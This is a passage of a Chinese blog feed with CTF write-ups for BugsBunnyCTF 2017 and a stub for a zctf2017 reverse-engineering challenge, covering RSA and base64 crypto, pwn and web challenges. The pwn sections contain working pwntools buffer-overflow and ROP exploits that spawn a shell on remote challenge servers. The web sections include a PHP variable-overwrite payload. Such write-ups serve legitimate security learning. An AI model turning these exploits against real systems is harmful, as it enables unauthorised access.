-<h1 id="Crypto-50"><a href="#Crypto-50" class="headerlink" title="Crypto-50"></a>Crypto-50</h1><p>就一直base64的解密。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;N0T_H4Rd_4T_4ll&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="babyRsa"><a href="#babyRsa" class="headerlink" title="babyRsa"></a>babyRsa</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">N: 20473673450356553867543177537</div><div class="line">e: 17</div></pre></td></tr></table></figure>
-<p>在<a href="http://factordb.com/index.php?query=20473673450356553867543177537" target="_blank" rel="external">factordb</a>上把N进行分解如下，得到p和q：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p = 2165121523231</div><div class="line">q = 9456131321351327</div></pre></td></tr></table></figure></p>
-<p>用以下脚本解出flag：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">n = <span class="number">20473673450356553867543177537</span></div><div class="line">p = <span class="number">2165121523231</span></div><div class="line">q = <span class="number">9456131321351327</span></div><div class="line">e = <span class="number">17</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</div><div class="line">      <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      g, y, x = egcd(b % a, a)</div><div class="line">      <span class="keyword">return</span> (g, x - (b // a) * y, y)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</div><div class="line">      <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      <span class="keyword">return</span> x % m</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(c, d, n)</span>:</span></div><div class="line">    <span class="keyword">return</span> pow(c, d, n)</div><div class="line"></div><div class="line">d = modinv(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</div><div class="line"><span class="keyword">print</span> d</div><div class="line">encfile = open(<span class="string">'enc.txt'</span>,<span class="string">'rb'</span>)</div><div class="line">decfile = open(<span class="string">'flag.txt'</span>,<span class="string">'wb'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</div><div class="line">	enc = encfile.readline()[:<span class="number">-1</span>]</div><div class="line">	<span class="keyword">print</span> enc</div><div class="line">	decfile.write(str(chr(decrypt(long(enc),d,n))))</div><div class="line">encfile.close()</div><div class="line">decfile.close()</div></pre></td></tr></table></figure></p>
-<p>运行到最后时会说overflow出错，不过不影响flag。最后的flag如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;Baby_RSA_Its_Cool_Lik3_school_haHAha&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;单刷好幸苦。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Crypto" scheme="http://yoursite.com/categories/writeup-Crypto/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BugsBunnyCTF2017-pwn-writeup</title>
-    <link href="http://yoursite.com/2017/07/30/BugsBunnyCTF2017-pwn-writeup/"/>
-    <id>http://yoursite.com/2017/07/30/BugsBunnyCTF2017-pwn-writeup/</id>
-    <published>2017-07-29T23:47:52.000Z</published>
-    <updated>2017-08-01T12:52:08.339Z</updated>
-    
-    <content type="html"><![CDATA[<p>单刷好幸苦。<br><a id="more"></a></p>
-<h1 id="Pwn50"><a href="#Pwn50" class="headerlink" title="Pwn50"></a>Pwn50</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">You look new here</div><div class="line">so this is my gift for you</div><div class="line">task : nc 54.153.19.139 5251</div><div class="line">just write something when connect , its always UP</div><div class="line">Author: TnMch</div></pre></td></tr></table></figure>
-<p>用了gets，有明显的溢出。题目中有提供了system函数执行。exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">r = remote(<span class="string">"54.153.19.139"</span>,<span class="string">"5251"</span>)</div><div class="line"></div><div class="line">v6 = <span class="number">0x62</span></div><div class="line">v7 = <span class="number">0x75</span></div><div class="line">v8 = <span class="number">0x67</span></div><div class="line">v9 = <span class="number">0xDEFACED</span></div><div class="line">offset = <span class="number">0x28</span> - <span class="number">0x10</span></div><div class="line">payload = <span class="string">'bug'</span> + <span class="string">'a'</span> * (offset <span class="number">-3</span>)+ p64(v9)</div><div class="line"></div><div class="line">r.sendline(payload)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p>
-<p>既然可以溢出，也可以用rop来做。exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">r = remote(<span class="string">"54.153.19.139"</span>,<span class="string">"5251"</span>)</div><div class="line">elf = ELF(<span class="string">"pwn50"</span>)</div><div class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</div><div class="line">binsh_addr = <span class="number">0x0000000000400773</span></div><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400743</span></div><div class="line">offset = <span class="number">56</span></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(binsh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">r.sendline(payload)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p>
-<p>然后我进去后找了好久的flag。以为那个pwn50是文件，结果最后发现是它是个文件夹mdzz。以后找flag可以用命令来帮忙：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ find /  -name flag</div><div class="line">find: &apos;/root&apos;: Permission denied</div><div class="line">/home/pwn50/flag</div><div class="line">...</div></pre></td></tr></table></figure></p>
-<p>最后的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;lool_cool_stuf_even_its_old!!!!!&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="Pwn100"><a href="#Pwn100" class="headerlink" title="Pwn100"></a>Pwn100</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Try this , maybe little hard</div><div class="line">task : nc 54.153.19.139 5252</div><div class="line">Author: TnMch</div></pre></td></tr></table></figure>
-<h1 id="pwn150"><a href="#pwn150" class="headerlink" title="pwn150"></a>pwn150</h1><p>用IDA调试后可以看到用fgets读入了192个字节，但起始位置距离rbp只有50个字节，存在溢出，而且程序没有开canary保护。溢出的offset推测为 0x50+8 = 88。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/16.jpg?raw=true" alt=""></p>
-<p>用gdb调试确定为88的偏移。由于程序中会fork出新进程，为调试方便可以在gdb调试开始时先输入<code>set follow-fork-mode parent</code>，然后在对应的地方下断点进行调试。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/17.jpg?raw=true" alt=""></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">elf = ELF(<span class="string">'pwn150'</span>)</div><div class="line">r = remote(<span class="string">"54.153.19.139"</span>,<span class="string">"5253"</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"UTC 2017"</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"Send me your message here:"</span>)</div><div class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</div><div class="line">sh_addr = elf.search(<span class="string">'sh'</span>).next()</div><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400883</span></div><div class="line">pop_rsi_pop_r15_ret =  <span class="number">0x0000000000400881</span></div><div class="line">offset = <span class="number">88</span></div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(sh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">r.send(payload)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
-<p>最后的flag：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ ls</div><div class="line">pwn150</div><div class="line">$ <span class="built_in">cd</span> pwn150</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">pwn150</div><div class="line">$ cat flag</div><div class="line">Bugs_Bunny&#123;did_i_help_you_Solve_it!oHH_talk_to_hacker:D&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="pwn300"><a href="#pwn300" class="headerlink" title="pwn300"></a>pwn300</h1>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;单刷好幸苦。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:bin" scheme="http://yoursite.com/categories/writeup-bin/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BugsBunnyCTF2017-web-writeup</title>
-    <link href="http://yoursite.com/2017/07/30/BugsBunnyCTF2017-web-writeup/"/>
-    <id>http://yoursite.com/2017/07/30/BugsBunnyCTF2017-web-writeup/</id>
-    <published>2017-07-29T23:32:03.000Z</published>
-    <updated>2017-07-31T09:55:09.003Z</updated>
-    
-    <content type="html"><![CDATA[<p>单刷好幸苦。<br><a id="more"></a></p>
-<h1 id="Nothing-here"><a href="#Nothing-here" class="headerlink" title="Nothing here"></a>Nothing here</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Nothing here !</div><div class="line">http://52.53.151.123/web/web5.php</div></pre></td></tr></table></figure>
-<p>访问后查看源代码，注释中有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QnVnc19CdW5ueXs1MjljNDI5YWJkZTIxNzFkMGEyNTU4NDQ3MmFmODIxN30K</div></pre></td></tr></table></figure></p>
-<p>base64解码，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;529c429abde2171d0a25584472af8217&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">You know your job</div><div class="line">http://52.53.151.123/web/web30.php</div></pre></td></tr></table></figure>
-<p>访问后题目说Only users of “Bugs_Bunny Browser” may access this page.。所以抓包改User-Agent。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/5.jpg?raw=true" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag=zn8XhqnlBRBetevoFcSQAw0OMVH6Kwj23svbneF1%2B5gDfBdn9osZBfB06cTub4ARg3OTTjsBIG7x;</div></pre></td></tr></table></figure>
-<p>中间有个%2B，是+号。在<a href="https://hashkiller.co.uk/text-encryption.aspx" target="_blank" rel="external">https://hashkiller.co.uk/text-encryption.aspx</a> 上，用密码<code>Hashkiller</code>解密。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;hashkiller_has_a_custom_encryption_ algorithm&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="Old-php-vuln"><a href="#Old-php-vuln" class="headerlink" title="Old php vuln !"></a>Old php vuln !</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Hey ,Agent</div><div class="line">Your mission is to hack this secure portal .</div><div class="line">Good luck.</div><div class="line">http://52.53.151.123/web/web35.php</div></pre></td></tr></table></figure>
-<h1 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PHP for noobs :p ?</div><div class="line">Maybe not this time :D</div><div class="line"></div><div class="line">http://34.253.165.46/SimplePhp/index.php</div><div class="line">source : http://34.253.165.46/SimplePhp/index.txt</div></pre></td></tr></table></figure>
-<p>题目提供了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line"></div><div class="line">$_403 = <span class="string">"Access Denied"</span>;</div><div class="line">$_200 = <span class="string">"Welcome Admin"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</div><div class="line">	<span class="keyword">die</span>(<span class="string">"BugsBunnyCTF is here :p..."</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</div><div class="line">	<span class="keyword">die</span>($_403);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)</div><div class="line">	$$key = $$value;</div><div class="line"></div><div class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)</div><div class="line">	$$key = $value;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</div><div class="line">	<span class="keyword">die</span>($_403);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"This is your flag : "</span>. $flag . <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">die</span>($_200);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>有很明显的变量覆盖漏洞。要求我们在post语句中有flag，同时在第二个foreach中有把<code>$flag</code>直接覆盖了，所以直接通过echo语句输出的flag是被修改过的。接着看看有什么输出点，比如有个<code>die($_200)</code>，结合第一个foreach的功能，我们可以在第二个foreach之前先将<code>$_200</code>的值覆盖为原flag的值。payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://34.253.165.46/SimplePhp/index.php?_200=flag</div><div class="line"></div><div class="line">POST:</div><div class="line">flag=1</div></pre></td></tr></table></figure></p>
-<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;Simple_PHP_1s_re4lly_fun_!!!&#125;</div></pre></td></tr></table></figure></p>
-<p>利用前面的<code>die($_403)</code>也可以实现。我们先把原flag的值覆盖到<code>$_403</code>上，然后构造<code>$_POST[&quot;flag&quot;] !== $flag</code>，从而<code>die($_403)</code>输出flag。payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://34.253.165.46/SimplePhp/index.php?_403=flag&amp;_POST=1</div><div class="line"></div><div class="line">POST:</div><div class="line">flag=</div></pre></td></tr></table></figure></p>
-<p>同样能获得flag。</p>
-<h1 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h1><p>前端加密问题。部分代码如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> h = prompt(<span class="string">"Please enter your passowrd"</span>);</div><div class="line"><span class="keyword">if</span>(generate(h[<span class="number">11</span>]+h[<span class="number">8</span>]+h[<span class="number">1</span>]+h[<span class="number">0</span>]+h[<span class="number">9</span>]+h[<span class="number">4</span>]+h[<span class="number">13</span>])==_&amp;&amp;generate(h[<span class="number">15</span>]+h[<span class="number">10</span>]+h[<span class="number">3</span>]+h[<span class="number">5</span>]+h[<span class="number">6</span>])==__&amp;&amp;generate(h[<span class="number">16</span>]+h[<span class="number">12</span>]+h[<span class="number">14</span>]+h[<span class="number">2</span>]+h[<span class="number">7</span>])==___)&#123;</div><div class="line">    alert(<span class="string">'your flag is Bugs_Bunny&#123;'</span>+h+<span class="string">'&#125;'</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    alert(<span class="string">'I\'m sorry my son it\' not easy'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>经过初步调试后几个重要的值如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">_ = 6b07fd4ea837c39e1542e1bbca01a224</div><div class="line"></div><div class="line">__ = 20ee80e63596799a1543bc9fd88d8878</div><div class="line"></div><div class="line">___ = 21232f297a57a5a743894a0e4a801fc3</div></pre></td></tr></table></figure></p>
-<p>而<code>generate</code>在逆向后发现是md5加密。在google上查到对应的md5解密对应如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">md5(tunisia) = 6b07fd4ea837c39e1542e1bbca01a224</div><div class="line">md5(bunny)   = 20ee80e63596799a1543bc9fd88d8878</div><div class="line">md5(admin)   = 21232f297a57a5a743894a0e4a801fc3</div></pre></td></tr></table></figure></p>
-<p>所以有如下对应关系：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13]</div><div class="line">  t     u    n    i    s    i    a</div><div class="line"></div><div class="line">h[15]+h[10]+h[3]+h[5]+h[6]</div><div class="line">  b     u     n   n    y</div><div class="line"></div><div class="line">h[16]+h[12]+h[14]+h[2]+h[7]</div><div class="line">  a     d     m     i    n</div></pre></td></tr></table></figure></p>
-<p>得到的h为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">inininynusutdamba</div></pre></td></tr></table></figure></p>
-<p>最后的flag为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;inininynusutdamba&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="LQI-X"><a href="#LQI-X" class="headerlink" title="LQI_X"></a>LQI_X</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://34.253.165.46/LQI_X</div></pre></td></tr></table></figure>
-<p>给了个登陆框，应有存在注入。</p>
-<h1 id="Walk-walk"><a href="#Walk-walk" class="headerlink" title="Walk walk"></a>Walk walk</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.chouaibhm.me</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170731/3.jpg?raw=true" alt=""></p>
-<p>发现是asw s3服务，存在未授权/信息泄露漏洞，可见<a href="https://book.ph0en1x.com/web/qi-ta-lou-dong/aws-lou-dong-xi-lie/s3-bucketxin-xi-xie-lu.html" target="_blank" rel="external">Awesome CTF Book:AWS 漏洞系列</a>。<br>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.chouaibhm.me.s3.amazonaws.com/</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170731/4.jpg?raw=true" alt=""></p>
-<h1 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h1><p>随便进行了一些功能测试，比如点1+2，则抓包会发现有data字段时我们输入的表达式，forward掉后返回结果。驶入的表达式只允许输入数字，中小括号，感叹号，乘号，减号。猜测后端用eval执行。一开始我以为xss，将payload进行一次jsfuck加密后能绕过过滤，不过没啥用等。然后有一次的payload过长，返回的报错信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Error: spawn E2BIG</div><div class="line">    at exports._errnoException (util.js:1018:11)</div><div class="line">    at ChildProcess.spawn (internal/child_process.js:319:11)</div><div class="line">    at exports.spawn (child_process.js:378:9)</div><div class="line">    at Object.exports.execFile (child_process.js:143:15)</div><div class="line">    at exports.exec (child_process.js:103:18)</div><div class="line">    at /app/apps.js:47:11</div><div class="line">    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)</div><div class="line">    at next (/app/node_modules/express/lib/router/route.js:137:13)</div><div class="line">    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)</div><div class="line">    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)</div></pre></td></tr></table></figure></p>
-<p>所以后端是用node.js。推测是要渗透nodojs。参考<a href="https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/" target="_blank" rel="external">Reverse shell on a Node.js application</a>和<a href="http://www.websecgeeks.com/2017/04/pentesting-nodejs-application-nodejs.html" target="_blank" rel="external">Pentesting Node.js Application : Nodejs Application Security </a>进行渗透，不过可惜没有成功。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;单刷好幸苦。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="web" scheme="http://yoursite.com/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>zctf2017-EasyReverse-writeup</title>
-    <link href="http://yoursite.com/2017/07/29/zctf2017-EasyReverse-writeup/"/>
-    <id>http://yoursite.com/2017/07/29/zctf2017-EasyReverse-writeup/</id>
-    <published>2017-07-29T07:26:31.000Z</published>
-    <updated>2017-07-31T00:01:45.511Z</updated>
-    
-    <content type="html"><![CDATA[<p>未完待续<br><a id="more"></a><br>题目给了一个dll文件。<br>用IDA打开，shift+F12查看字符串。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/2.jpg?raw=true" alt=""></p>
-<p>比如说有个yes字符串，双击进去。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/3.jpg?raw=true" alt=""></p>
-<p>后面的<code>DATA XREF: get_string+74o</code>指明了引用该字符串的地址。双击跳转到代码段(.text)。利用f5汇编功能</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;未完待续&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Reverse" scheme="http://yoursite.com/categories/writeup-Reverse/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="re" scheme="http://yoursite.com/tags/re/"/>
     
   </entry>
   
